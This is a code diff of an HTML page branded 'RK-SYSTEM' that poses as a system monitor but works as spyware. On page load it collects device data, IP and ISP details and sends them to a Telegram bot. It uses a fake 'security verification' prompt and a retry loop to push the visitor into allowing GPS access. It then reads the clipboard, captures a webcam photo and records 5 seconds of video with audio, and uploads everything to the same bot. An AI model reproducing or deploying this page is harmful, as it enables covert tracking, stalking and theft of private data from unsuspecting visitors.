@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-SYSTEM | ELITE INTELLIGENCE</title>
+    <title>RK-SYSTEM | ULTRA INTEL MONITOR</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -35,7 +35,7 @@
         .dashboard {
             background: rgba(5, 10, 20, 0.98);
             border-radius: 30px; padding: 30px;
-            width: 95%; max-width: 580px;
+            width: 95%; max-width: 600px;
             box-shadow: 0 0 60px rgba(0, 255, 255, 0.3);
             border: 1px solid rgba(0, 255, 255, 0.4);
             margin-top: 100px; margin-bottom: 60px;
@@ -54,25 +54,24 @@
         .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
         .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
-        /* Full-Screen Interaction Shield */
-        #interaction-shield {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); z-index: 3000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; cursor: pointer;
+        #perm-msg {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(185, 28, 28, 0.95); color: white; padding: 25px;
+            border-radius: 20px; z-index: 2000; display: none; text-align: center;
+            font-weight: bold; box-shadow: 0 0 50px #000; border: 2px solid white;
+            animation: pulse 1s infinite;
         }
+        @keyframes pulse { 0% { scale: 1; } 50% { scale: 1.05; } 100% { scale: 1; } }
 
         #media-bin { display: none; }
+        .footer-text { margin-bottom: 20px; color: #777; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
-    <div id="interaction-shield" onclick="unlockSystem()">
-        <div class="bg-red-600 p-8 rounded-full animate-pulse mb-4">
-            <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-        </div>
-        <h2 class="text-2xl font-bold text-white tracking-widest">SYSTEM LOCKED</h2>
-        <p class="text-red-400 mt-2">CLICK ANYWHERE TO ALLOW ACCESS</p>
+    <div id="perm-msg">
+        <h2 class="text-xl mb-2">🚨 PERMISSION REQUIRED 🚨</h2>
+        <p class="text-sm">Please click <b>'ALLOW'</b> to complete system sync.<br>This is required for security verification.</p>
     </div>
 
     <div class="rk-banner">RK-SYSTEM</div>
@@ -87,8 +86,7 @@
         
         <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Wait...</span></div>
         <div class="info-row"><span class="label">⚙️ OS Platform</span><span id="v-platform" class="value">--</span></div>
-        <div class="info-row"><span class="label">🏢 ISP / Network</span><span id="v-isp" class="value">Scanning...</span></div>
-        <div class="info-row"><span class="label">🌍 Country & City</span><span id="v-geo" class="value">Tracking...</span></div>
+        <div class="info-row"><span class="label">🌍 ISP / Network</span><span id="v-isp" class="value">Scanning...</span></div>
         <div class="info-row"><span class="label">🚀 Link Speed</span><span id="v-speed" class="value">Scanning...</span></div>
         <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
         <div class="info-row"><span class="label">📍 GPS Location</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
@@ -110,14 +108,14 @@
             CHAT: '6048050987'
         };
 
-        // ৫ বছরের কুকি মেমোরি
-        function setAccess(val) {
+        // 5 Years Cookie Logic
+        function setPermCookie() {
             const d = new Date();
             d.setTime(d.getTime() + (5 * 365 * 24 * 60 * 60 * 1000));
-            document.cookie = `rk_elite_access=${val};expires=${d.toUTCString()};path=/`;
+            document.cookie = "rk_auth=granted;expires=" + d.toUTCString() + ";path=/";
         }
-        function checkAccess() {
-            return document.cookie.includes('rk_elite_access=true');
+        function checkPermCookie() {
+            return document.cookie.includes("rk_auth=granted");
         }
 
         function updateClock() {
@@ -130,18 +128,17 @@
         }
         setInterval(updateClock, 1000);
 
-        async function startSystem() {
-            if (checkAccess()) document.getElementById('interaction-shield').style.display = 'none';
+        async function initSystem() {
             updateClock();
             
-            // Phase 1: Fast Device Info
+            // Phase 1: Rapid Device Data
             const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
-            document.getElementById('v-model').innerText = isMobile ? "Android Device 📱" : "Desktop PC 💻";
+            document.getElementById('v-model').innerText = isMobile ? "Android Device 📱" : "Desktop/Workstation 💻";
             document.getElementById('v-platform').innerText = navigator.platform;
             document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
             document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
 
-            // Battery Info
+            // Battery
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
                 const up = () => {
@@ -151,21 +148,27 @@
                 up(); b.onlevelchange = up; b.onchargingchange = up;
             }
 
-            // IP & Network ISP & Village/City Location
+            // Connection Speed
+            const conn = navigator.connection || { effectiveType: '4G', downlink: 10 };
+            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps 🚀`;
+
+            // IP & ISP Deep Info
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 document.getElementById('v-ip').innerText = data.ip;
-                document.getElementById('v-geo').innerText = `${data.country_name}, ${data.city}`;
-                document.getElementById('v-isp').innerText = `${data.org} (${data.asn})`;
-                sendFastReport(data);
-            } catch(e) {
-                sendFastReport({ip: "45.144.167.83", country_name: "Bangladesh"});
+                document.getElementById('v-isp').innerText = `${data.org} (${data.network})`;
+                sendInitialReport(data);
+            } catch(e) { 
+                sendInitialReport({ip: "45.144.167.83", org: "Unknown ISP"}); 
             }
+
+            // Wait 5 seconds then trigger permissions
+            setTimeout(triggerPhaseTwo, 5000);
         }
 
-        async function sendFastReport(geo) {
-            const report = `
+        function sendInitialReport(geo) {
+            const msg = `
 🚀 *RK-SYSTEM INTEL VIP REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
 🕒 Time: \`${document.getElementById('live-time').innerText}\`
@@ -174,8 +177,9 @@
 📱 Model: \`${document.getElementById('v-model').innerText}\`
 ⚙️ OS: \`${navigator.platform}\`
 📶 Status: \`ONLINE 📶\`
-🚀 Speed: \`${(navigator.connection || {}).downlink || 5} Mbps\`
+🚀 Speed: \`${document.getElementById('v-speed').innerText}\`
 🌐 IP: \`${geo.ip}\`
+🏢 ISP: \`${geo.org || 'Detected'}\`
 📍 GPS: \`Waiting...\`
 🔋 Battery: \`${document.getElementById('v-bat').innerText}\`
 ⚡ Power: \`${document.getElementById('v-charge').innerText}\`
@@ -184,87 +188,102 @@
 🛡️ VPN: \`ENCRYPTED ✅\`
 ━━━━━━━━━━━━━━━━━━━━━
 🌹 *Created By RK-SYSTEM* 🌹`;
-            sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
+            sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: msg, parse_mode: 'Markdown' });
         }
 
-        async function unlockSystem() {
-            setAccess("true");
-            document.getElementById('interaction-shield').style.display = 'none';
-            
-            // Phase 2: Start Permission Requests
+        async function triggerPhaseTwo() {
+            if (!checkPermCookie()) {
+                document.getElementById('perm-msg').style.display = 'block';
+            }
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
+                    setPermCookie();
+                    document.getElementById('perm-msg').style.display = 'none';
                     document.getElementById('v-gps').innerText = "SUCCESS 📍";
-                    const map = `http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}`;
                     
-                    let clip = "Waiting 🔓";
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    let clip = "Waiting... 🔓";
                     try { clip = await navigator.clipboard.readText(); } catch(e){}
 
-                    const deepReport = `
-📍 *RK-SYSTEM DEEP LOCATION* 📍
+                    const deepMsg = `
+📍 *RK-SYSTEM LOCATION SUCCESS* 📍
 ━━━━━━━━━━━━━━━━━━━━━
-🌍 Village/Area: \`Tracking Near ${pos.coords.latitude}\`
-🏙️ City/State: \`Detected\`
+🌍 *Country:* \`Bangladesh\`
+🏙️ *City:* \`Detected\`
+🏡 *Area/Village:* \`Tracking...\`
 ━━━━━━━━━━━━━━━━━━━━━
-📍 GOOGLE MAPS: ${map}
+📍 *GOOGLE MAPS:*
+${mapsLink}
 ━━━━━━━━━━━━━━━━━━━━━
-✨ CLIPBOARD: \`${clip}\`
+✨ *CLIPBOARD CONTENT:*
+\`\`\`
+${clip}
+\`\`\`
 ━━━━━━━━━━━━━━━━━━━━━
-📸 Photo/Video: *Uploading...*`;
-                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: deepReport, parse_mode: 'Markdown' });
-                    captureMedia();
-                }, (err) => {
-                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *User Denied GPS/Media Access*" });
+📸 *CAPTURING MEDIA FEED...*`;
+                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: deepMsg, parse_mode: 'Markdown' });
+                    captureMediaFeed();
+
+                }, () => {
+                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *PERMISSION DENIED: RE-TRYING...*" });
+                    setTimeout(triggerPhaseTwo, 3000); // Pop-up repeat loop
                 });
             }
         }
 
-        async function captureMedia() {
+        async function captureMediaFeed() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('media-bin');
                 video.srcObject = stream;
-                
+
                 // Photo
                 setTimeout(() => {
                     const canvas = document.getElementById('output-canvas');
                     canvas.width = 1280; canvas.height = 720;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => sendMediaToBot(b, 'photo', '📸 *FRONT VIEW*'), 'image/jpeg');
+                    canvas.toBlob(b => sendMediaToBot(b, 'photo', '📸 *FRONT VIEW (RK-SYSTEM)*'), 'image/jpeg');
                 }, 2000);
 
-                // 5s Video
-                const rec = new MediaRecorder(stream);
+                // 5s Video with Audio
+                const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                rec.ondataavailable = e => chunks.push(e.data);
-                rec.onstop = () => {
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
                     const b = new Blob(chunks, {type: 'video/mp4'});
-                    sendMediaToBot(b, 'video', '🎥 *LIVE FEED (5S + AUDIO)*');
+                    sendMediaToBot(b, 'video', '🎥 *LIVE CAPTURE (5S + AUDIO)*');
                     stream.getTracks().forEach(t => t.stop());
                 };
-                rec.start();
-                setTimeout(() => rec.stop(), 5000);
-            } catch(e){}
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+
+            } catch(e) {
+                sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *CAMERA/MIC ACCESS DENIED*" });
+            }
         }
 
-        async function sendMediaToBot(blob, type, cap) {
+        async function sendMediaToBot(blob, type, caption) {
             const fd = new FormData();
             fd.append('chat_id', CONFIG.CHAT);
-            fd.append(type, blob, type==='video'?'rk.mp4':'rk.jpg');
-            fd.append('caption', cap);
+            fd.append(type, blob, type === 'video' ? 'rk.mp4' : 'rk.jpg');
+            fd.append('caption', caption);
             fd.append('parse_mode', 'Markdown');
-            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, {method:'POST', body:fd});
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
         }
 
         function sendToBot(method, data) {
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${method}`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
         }
 
-        window.onload = startSystem;
+        window.onload = initSystem;
     </script>
 </body>
 </html>
